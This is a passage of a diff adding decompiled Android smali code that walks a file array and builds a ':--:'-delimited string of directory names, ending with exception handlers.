+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    const-string v25, ":--:"
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v24
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v23
+
+    move-object/from16 v7, v23
+
+    :cond_444
+    add-int/lit8 v16, v16, 0x1
+
+    goto/16 :goto_1a5
+
+    .line 61
+    :cond_448
+    move-object/from16 v23, v19
+
+    move/from16 v24, v20
+
+    aget-object v23, v23, v24
+
+    move-object/from16 v21, v23
+
+    .line 62
+    move-object/from16 v23, v21
+
+    invoke-virtual/range {v23 .. v23}, Ljava/io/File;->isDirectory()Z
+
+    move-result v23
+
+    if-eqz v23, :cond_492
+
+    .line 63
+    new-instance v23, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v23
+
+    move-object/from16 v23, v33
+
+    move-object/from16 v24, v33
+
+    invoke-direct/range {v24 .. v24}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v24, v8
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    new-instance v24, Ljava/lang/StringBuffer;
+
+    move-object/from16 v33, v24
+
+    move-object/from16 v24, v33
+
+    move-object/from16 v25, v33
+
+    invoke-direct/range {v25 .. v25}, Ljava/lang/StringBuffer;-><init>()V
+
+    move-object/from16 v25, v21
+
+    invoke-virtual/range {v25 .. v25}, Ljava/io/File;->getName()Ljava/lang/String;
+
+    move-result-object v25
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    const-string v25, ":--:"
+
+    invoke-virtual/range {v24 .. v25}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v24
+
+    invoke-virtual/range {v24 .. v24}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v24
+
+    invoke-virtual/range {v23 .. v24}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v23
+
+    invoke-virtual/range {v23 .. v23}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+    :try_end_48f
+    .catch Ljava/lang/Exception; {:try_start_3b0 .. :try_end_48f} :catch_496
+
+    move-result-object v23
+
+    move-object/from16 v8, v23
+
+    :cond_492
+    add-int/lit8 v20, v20, 0x1
+
+    goto/16 :goto_1f2
+
+    :catch_496
+    move-exception v23
+
+    move-object/from16 v9, v23
+
+    goto/16 :goto_201
+
+    .line 88
+    :catch_49b
+    move-exception v23
+
+    move-object/from16 v13, v23
+
+    goto/16 :goto_3ab
+.end method
